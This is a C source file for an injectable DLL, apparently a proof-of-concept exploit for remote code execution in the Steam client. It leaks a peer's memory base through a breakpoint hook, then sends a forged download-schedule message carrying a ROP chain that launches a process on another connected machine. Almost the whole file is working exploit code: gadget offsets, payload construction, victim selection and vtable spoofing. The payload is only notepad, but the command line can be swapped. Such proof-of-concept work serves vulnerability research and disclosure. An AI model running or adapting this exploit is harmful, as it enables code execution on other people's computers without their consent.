// Build-locked to steamclient64_june24.dll
// Build: cl /LD /O2 rce_downloadschedule.c /Fe:rce_downloadschedule.dll
// Inject into steam.exe (see inject.py) on the victim
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define LOG_PATH "C:\\Users\\Public\\poc.log"

// steamclient64_june24.dll RVAs (base 0x138000000)
#define USER_RVA_SEND     0x906AD0   // SendSteamToSteam(manager, msg, target)
#define USER_RVA_CTOR     0xCF8F90   // CProtoBufMsg::CProtoBufMsg(EMsg)
#define USER_RVA_VFTABLE  0x130BAD0  // any CProtoBufMsg<T> vftable (spoof template)
#define USER_RVA_G_ROOT   0x17CC738  // qword_1397CC738 (manager = *(root + 0x1070))

// leak capture: dispatcher case-24 "cmp rsi,rax" (rsi = begin of received dword array)
#define LEAK_RVA          0x90251C
#define LEAK_PTR_RVA      (USER_RVA_G_ROOT + 0xC28)  // RVA of the pointer leaked at array[2..3]
#define LEAK_QWORD_OFF    8

// IAT slots (absolute = host_base + RVA; *[slot] = real fn)
#define CREATEPROCA_IAT_RVA  0x1154248
#define EXITTHREAD_IAT_RVA   0x1154860

// ROP gadget RVAs
#define G_POP_RCX     0x7119B    // pop rcx ; ret
#define G_POP_RDX     0x53813    // pop rdx ; ret
#define G_POP_R8      0xD4AF2    // pop r8  ; ret
#define G_POP_RAX     0x7273     // pop rax ; ret
#define G_JMP_RAX     0x60CC7    // jmp qword [rax]
#define G_MOV_RCX_RDX 0xD00478   // mov qword [rcx], rdx ; ret
#define G_ZERO_R9     0x3AA11    // xor r9,r9 ; ... ; rep ret
#define G_RET         0x7119C    // bare ret
#define G_ADD_RSP_58  0x7270     // add rsp, 0x58 ; ret

// writable steamclient64 .data scratch (host_base + RVA): cmdline + STARTUPINFOA + PROCESS_INFORMATION
#define SCRATCH_RVA          0x1800000
#define SCRATCH_STARTUP_OFF  0x100
#define SCRATCH_PROCINFO_OFF 0x200

// manager / client-map struct offsets
#define OFF_MANAGER_FROM_ROOT     0x1070
#define OFF_MMAPCLIENTS_COUNT     1844
#define OFF_MMAPCLIENTS_ARRAY     1856
#define MAP_ELEM_STRIDE           32
#define MAP_ELEM_CLIENT_ID_OFF    16
#define MAP_ELEM_PTR_OFF          24
#define OFF_ENTRY_212             212
#define OFF_MANAGER_OWN_CLIENT_ID 1272

#define VICTIM_CLIENT_ID 0ULL    // 0 = auto-select the other connected client
#define RIP_ELEM_LO      204     // apps_scheduled index of the saved-RIP low dword

static HMODULE  g_hSteamClient;
static uint8_t *g_local_base;
static void    *g_spoof_vtable[64];
static uint8_t  g_payload[16384];
static size_t   g_payload_len;

static volatile uint64_t g_host_base;
static uint8_t *g_bp_addr;
static uint8_t  g_orig_byte;

typedef void (__fastcall *fn_ctor_t)(void *self, int emsg, int unknown);
typedef char (__fastcall *fn_send_t)(void *manager, void *msg, void *target);

static void log_msg(const char *fmt, ...);

static void patch_byte(uint8_t v) {
    DWORD op;
    VirtualProtect(g_bp_addr, 1, PAGE_EXECUTE_READWRITE, &op);
    *g_bp_addr = v;
    VirtualProtect(g_bp_addr, 1, op, &op);
    FlushInstructionCache(GetCurrentProcess(), g_bp_addr, 1);
}

// Breakpoint the dispatcher just as it receives a 9526; rsi points at the received
// dword array, whose elements [2..3] carry a leaked steamclient64 pointer. Recover
// the host's ASLR base from it, then let the instruction re-execute.
static LONG CALLBACK veh(PEXCEPTION_POINTERS ep) {
    CONTEXT *c = ep->ContextRecord;
    DWORD code = ep->ExceptionRecord->ExceptionCode;

    if (code == EXCEPTION_BREAKPOINT &&
        (uint8_t *)ep->ExceptionRecord->ExceptionAddress == g_bp_addr) {
        patch_byte(g_orig_byte);
        uint64_t rsi = c->Rsi, rax = c->Rax;
        if (g_host_base == 0 && (rax - rsi) >= (LEAK_QWORD_OFF + 8)) {
            uint64_t v = 0;
            __try { v = *(uint64_t *)(rsi + LEAK_QWORD_OFF); }
            __except (EXCEPTION_EXECUTE_HANDLER) { v = 0; }
            uint64_t base = v - LEAK_PTR_RVA;
            if (v && (base & 0xFFFF) == 0 && (base >> 44) == 0x7) g_host_base = base;
        }
        c->Rip = (DWORD64)g_bp_addr;          // re-execute the original instruction
        if (g_host_base == 0) c->EFlags |= 0x100;  // single-step to re-arm
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (code == EXCEPTION_SINGLE_STEP && g_host_base == 0 && g_bp_addr) {
        patch_byte(0xCC);                      // re-arm for the next 9526
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static int put_uint32_varint(uint8_t *out, uint32_t v) {
    int n = 0;
    do { uint8_t b = v & 0x7F; v >>= 7; if (v) b |= 0x80; out[n++] = b; } while (v);
    return n;
}

// build our payload
static int build_rop(uint64_t *rop, uint64_t base) {
    int n = 0;
    const uint64_t scratch = base + SCRATCH_RVA;
    const uint64_t cmdline = scratch;
    const uint64_t startup = scratch + SCRATCH_STARTUP_OFF;
    const uint64_t procinf = scratch + SCRATCH_PROCINFO_OFF;

    // nuke the VProf epilogue
    rop[n++] = base + G_POP_RCX;   // saved RIP
    rop[n++] = 0;                  // VProf scope cookie -> NULL

    // write "notepad.exe\0"
    rop[n++] = base + G_POP_RCX;   rop[n++] = cmdline;
    rop[n++] = base + G_POP_RDX;   rop[n++] = 0x2E64617065746F6EULL;  // "notepad."
    rop[n++] = base + G_MOV_RCX_RDX;
    rop[n++] = base + G_POP_RCX;   rop[n++] = cmdline + 8;
    rop[n++] = base + G_POP_RDX;   rop[n++] = 0x0000000000657865ULL;  // "exe\0..."
    rop[n++] = base + G_MOV_RCX_RDX;
    // zero STARTUPINFOA
    rop[n++] = base + G_POP_RDX;   rop[n++] = 0;
    rop[n++] = base + G_POP_RCX;   rop[n++] = startup + 0x00;  rop[n++] = base + G_MOV_RCX_RDX;
    rop[n++] = base + G_POP_RCX;   rop[n++] = startup + 0x08;  rop[n++] = base + G_MOV_RCX_RDX;
    rop[n++] = base + G_POP_RCX;   rop[n++] = startup + 0x10;  rop[n++] = base + G_MOV_RCX_RDX;
    rop[n++] = base + G_POP_RCX;   rop[n++] = startup + 0x18;  rop[n++] = base + G_MOV_RCX_RDX;
    rop[n++] = base + G_POP_RCX;   rop[n++] = startup + 0x38;  rop[n++] = base + G_MOV_RCX_RDX;
    // CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)
    rop[n++] = base + G_POP_RCX;   rop[n++] = 0; 
    rop[n++] = base + G_POP_RDX;   rop[n++] = cmdline;
    rop[n++] = base + G_POP_R8;    rop[n++] = 0;
    rop[n++] = base + G_ZERO_R9;               
    rop[n++] = base + G_POP_RAX;   rop[n++] = base + CREATEPROCA_IAT_RVA; // &__imp_CreateProcessA
    rop[n++] = base + G_RET;                   
    rop[n++] = base + G_JMP_RAX;               
    // CreateProcessA stack args
    rop[n++] = base + G_ADD_RSP_58;// fake ret: on return, pivot past the spent slots
    rop[n++] = 0;                  // [+0x08] shadow
    rop[n++] = 0;                  // [+0x10] shadow
    rop[n++] = 0;                  // [+0x18] shadow
    rop[n++] = 0;                  // [+0x20] shadow
    rop[n++] = 0;                  // [+0x28] bInheritHandles
    rop[n++] = 0;                  // [+0x30] dwCreationFlags
    rop[n++] = 0;                  // [+0x38] lpEnvironment
    rop[n++] = 0;                  // [+0x40] lpCurrentDirectory
    rop[n++] = startup;            // [+0x48] lpStartupInfo
    rop[n++] = procinf;            // [+0x50] lpProcessInformation
    // exit tail: add rsp,0x58 lands here; ExitThread(0) keeps the victim process alive
    rop[n++] = 0;                  // pad (pivot lands on the next slot)
    rop[n++] = base + G_POP_RCX;   rop[n++] = 0;     
    rop[n++] = base + G_POP_RAX;   rop[n++] = base + EXITTHREAD_IAT_RVA; 
    rop[n++] = base + G_RET;                                       
    rop[n++] = base + G_JMP_RAX;   
    return n;
}

// Forge CMsgRemoteClientDownloadScheduleChanged (EMsg 9526)
static void build_payload(uint64_t base) {
    uint64_t rop[96];
    int nrop = build_rop(rop, base);
    int total = RIP_ELEM_LO + 2 * nrop;   // filler + 2 dwords per ROP qword

    uint8_t *p = g_payload;
    *p++ = 0x36; *p++ = 0x25; *p++ = 0x00; *p++ = 0x80;   // EMsg 9526 | proto flag
    *p++ = 0x12; *p++ = 0x00; *p++ = 0x00; *p++ = 0x00;   // hdr_size = 18
    *p++ = 0x51; for (int i = 0; i < 8; i++) *p++ = 0xff; // jobid_source = -1
    *p++ = 0x59; for (int i = 0; i < 8; i++) *p++ = 0xff; // jobid_target = -1

    for (int i = 0; i < total; i++) {
        uint32_t val;
        if (i < RIP_ELEM_LO) {
            val = 0x41410000u | (uint32_t)(i & 0xFFFF);   // benign filler
        } else {
            int slot = (i - RIP_ELEM_LO) >> 1, hi = (i - RIP_ELEM_LO) & 1;
            val = hi ? (uint32_t)(rop[slot] >> 32) : (uint32_t)rop[slot];
        }
        *p++ = 0x28;
        p += put_uint32_varint(p, val);
    }
    g_payload_len = (size_t)(p - g_payload);
    log_msg("[+] payload %zu bytes, %d elems, %d ROP qwords, base=0x%016llx",
            g_payload_len, total, nrop, (unsigned long long)base);
}

// Spoof the outgoing CProtoBufMsg vtable so get_byte_size / serialize emit our bytes
// verbatim instead of protobuf-encoding a real message.
static __int64 __fastcall my_serialize(__int64 self, __int64 buffer, __int64 size) {
    size_t n = g_payload_len;
    if ((__int64)n > size) n = (size_t)size;
    __try { memcpy((void *)buffer, g_payload, n); }
    __except (EXCEPTION_EXECUTE_HANDLER) { n = 0; }
    return (__int64)n;
}
static __int64 __fastcall my_get_byte_size(__int64 self) { return (__int64)g_payload_len; }

// Pick a connected peer CRemoteClient to target (pin != 0 forces a specific client_id).
static void *select_target(void *manager, uint64_t pin, uint64_t *out_clid) {
    int count = *(int *)((uintptr_t)manager + OFF_MMAPCLIENTS_COUNT);
    void **arr = *(void ***)((uintptr_t)manager + OFF_MMAPCLIENTS_ARRAY);
    if (count <= 0 || !arr) return NULL;
    uint64_t own = *(uint64_t *)((uintptr_t)manager + OFF_MANAGER_OWN_CLIENT_ID);
    uint8_t *bse = (uint8_t *)arr;
    void *fallback = NULL; uint64_t fallback_clid = 0;
    for (int i = 0; i < count; i++) {
        uint8_t *elem = bse + (size_t)i * MAP_ELEM_STRIDE;
        if (*(int *)elem == i) continue;
        uint64_t clid = *(uint64_t *)(elem + MAP_ELEM_CLIENT_ID_OFF);
        void    *ptr  = *(void   **)(elem + MAP_ELEM_PTR_OFF);
        if (!ptr || clid == 0) continue;
        if (pin) { if (clid == pin) { *out_clid = clid; return ptr; } continue; }
        if (clid == own) continue;
        if (*(uint8_t *)((char *)ptr + OFF_ENTRY_212)) { *out_clid = clid; return ptr; }
        if (!fallback) { fallback = ptr; fallback_clid = clid; }
    }
    if (fallback) *out_clid = fallback_clid;
    return fallback;
}

static void log_msg(const char *fmt, ...) {
    char buf[1024];
    va_list ap; va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    HANDLE h = CreateFileA(LOG_PATH, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(h, buf, (DWORD)strlen(buf), &w, NULL); WriteFile(h, "\r\n", 2, &w, NULL); CloseHandle(h);
    }
}

static DWORD WINAPI worker(LPVOID arg) {
    (void)arg;
    log_msg("attached, PID=%lu", GetCurrentProcessId());

    for (int i = 0; i < 120 && !g_hSteamClient; i++) { g_hSteamClient = GetModuleHandleA("steamclient64.dll"); if (!g_hSteamClient) Sleep(500); }
    if (!g_hSteamClient) { log_msg("[!] steamclient64.dll never loaded"); return 1; }
    g_local_base = (uint8_t *)g_hSteamClient;

    // Arm the leak hook and wait for the host's 9526 push (auto-fires on connect).
    g_bp_addr = g_local_base + LEAK_RVA;
    g_orig_byte = *g_bp_addr;
    if (!AddVectoredExceptionHandler(1, veh)) { log_msg("[!] AddVectoredExceptionHandler failed"); return 1; }
    patch_byte(0xCC);
    log_msg("[*] waiting for host 9526 push (leak)...");
    for (int i = 0; i < 600 && g_host_base == 0; i++) Sleep(500);
    if (g_host_base == 0) { log_msg("[!] leak not captured"); return 1; }
    log_msg("[+] leaked back, host steamclient64 base = 0x%016llx", (unsigned long long)g_host_base);

    uintptr_t lbase = (uintptr_t)g_local_base;
    fn_ctor_t fn_ctor = (fn_ctor_t)(lbase + USER_RVA_CTOR);
    fn_send_t fn_send = (fn_send_t)(lbase + USER_RVA_SEND);
    void *spoof_template = (void *)(lbase + USER_RVA_VFTABLE);
    uintptr_t *p_root = (uintptr_t *)(lbase + USER_RVA_G_ROOT);

    build_payload(g_host_base);

    void *manager = NULL;
    for (int i = 0; i < 240 && !manager; i++) { uintptr_t rv = *p_root; if (rv) manager = *(void **)(rv + OFF_MANAGER_FROM_ROOT); if (!manager) Sleep(500); }
    if (!manager) { log_msg("[!] manager not set"); return 1; }

    uint64_t target_clid = 0; void *target = NULL;
    for (int i = 0; i < 240 && !target; i++) { target = select_target(manager, VICTIM_CLIENT_ID, &target_clid); if (!target) Sleep(500); }
    if (!target) { log_msg("[!] no target CRemoteClient"); return 1; }
    log_msg("[+] target @ %p client_id=0x%016llx", target, (unsigned long long)target_clid);

    void *msg = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!msg) { log_msg("[!] alloc fail"); return 1; }
    memset(msg, 0, 4096);
    fn_ctor(msg, 9526, 0);
    memcpy(g_spoof_vtable, spoof_template, sizeof(g_spoof_vtable));
    g_spoof_vtable[3] = (void *)&my_get_byte_size;
    g_spoof_vtable[4] = (void *)&my_serialize;
    *(void **)msg = (void *)g_spoof_vtable;

    log_msg("[*] sending...");
    __try { char rc = fn_send(manager, msg, target); log_msg("[+] send returned %d", rc); }
    __except (EXCEPTION_EXECUTE_HANDLER) { log_msg("[!] send exception 0x%08lx", GetExceptionCode()); }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        HANDLE h = CreateThread(NULL, 0, worker, NULL, 0, NULL);
        if (h) CloseHandle(h);
    }
    return TRUE;
}
